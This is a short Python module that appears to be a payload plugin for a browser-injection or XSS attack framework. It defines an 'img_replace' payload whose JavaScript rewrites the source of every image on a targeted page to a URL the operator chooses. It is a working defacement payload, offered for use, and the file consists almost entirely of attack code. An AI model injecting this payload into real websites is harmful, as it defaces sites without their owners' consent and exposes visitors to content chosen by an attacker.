#!/usr/bin/python3.7
name="img_replace"
description="Replace all images on site with an image pointed to by URL"
options = [["URL", "URL of the new image", ""]] 

payload = """
var imgs = document.getElementsByTagName("img");
for(var i=0, l=imgs.length; i<l; i++) {
imgs[i].src = "URL";
}
"""
